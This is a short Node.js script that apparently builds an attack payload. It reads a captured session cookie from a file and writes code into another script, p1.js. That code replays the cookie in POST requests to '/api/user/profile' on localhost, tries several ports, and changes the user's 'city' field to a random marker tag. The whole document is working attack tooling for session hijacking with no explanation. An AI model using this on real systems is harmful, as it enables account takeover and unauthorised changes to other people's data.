const fs=require('fs');
let t=fs.readFileSync('p1.js','utf8');
const ck=fs.readFileSync('..\\ck.txt','utf8');
const tag='PT'+Math.floor(Math.random()*9000+1000);
const code=`
const http=require('http');
const CK=${JSON.stringify(ck)};
const body=JSON.stringify({city:'${tag}'});
const ports=[3001,8000,8080,3005,4000,3000,80];
const go=(i)=>{
  if(i>=ports.length) return;
  const p=ports[i];
  const r=http.request({host:'127.0.0.1',port:p,path:'/api/user/profile',method:'POST',headers:{'content-type':'application/json','content-length':Buffer.byteLength(body),cookie:CK},timeout:4000},res=>{res.resume();console.log(p+'='+res.statusCode); if(res.statusCode!==200) go(i+1)});
  r.on('error',()=>go(i+1)); r.on('timeout',()=>{r.destroy();go(i+1)}); r.write(body); r.end();
};
go(0);
`;
t=t.replace(/const CODE=.*\n/, 'const CODE='+JSON.stringify(code)+'\n');
fs.writeFileSync('p1.js',t);console.log('tag='+tag);
